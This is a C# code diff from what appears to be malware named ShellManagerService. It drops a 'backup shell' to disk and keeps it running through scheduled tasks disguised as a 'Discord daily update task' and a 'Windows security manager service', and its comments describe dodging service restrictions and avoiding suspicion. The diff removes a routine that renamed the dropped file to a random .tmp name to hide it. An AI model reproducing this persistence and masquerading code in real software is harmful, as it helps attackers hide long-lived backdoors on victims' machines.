@@ -59,12 +59,6 @@ namespace ShellManagerService
 
             //Start process
             StartProcess(tmp_name);
-
-            Thread.Sleep(5000);
-
-            //Rename the file changing the extension to .tmp to avoid suspicion in case someone opens the folder I guess(?)
-            old_tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, RandomModuleName(tmp_name_length));
-            File.Move(tmp_name, old_tmp_name);
         }
         //This loads the second "backup shell" on disk and starts a task which should replay once (or more) times a day
         public static void LoadSecondShellAndCreateTask()
@@ -97,13 +91,6 @@ namespace ShellManagerService
                 var t = ts.Execute(full_path).Every(1).Days().Starting(DateTime.Now.AddHours(6)).AsTask("Discord daily update task");
             }
         }
-        //Give the module a random ass name idk
-        public static string RandomModuleName(int length)
-        {
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            return (new string(Enumerable.Repeat(chars, length)
-                .Select(s => s[random.Next(s.Length)]).ToArray()) + ".tmp");
-        }
         //Services run as User 0, therefore cannot start other processes. A possible bypass is to schedule a single run Task for the executable :)
         public static void StartProcess(string file_path)
         {
@@ -111,7 +98,7 @@ namespace ShellManagerService
             {
                 var t = ts.Execute(file_path)
                     .Once()
-                    .Starting(DateTime.Now.AddSeconds(1))
+                    .Starting(DateTime.Now.AddSeconds(3))
                     .AsTask("Windows security manager service is used to check health and integrity of important system resources and must be run regularly.");
             }
         }
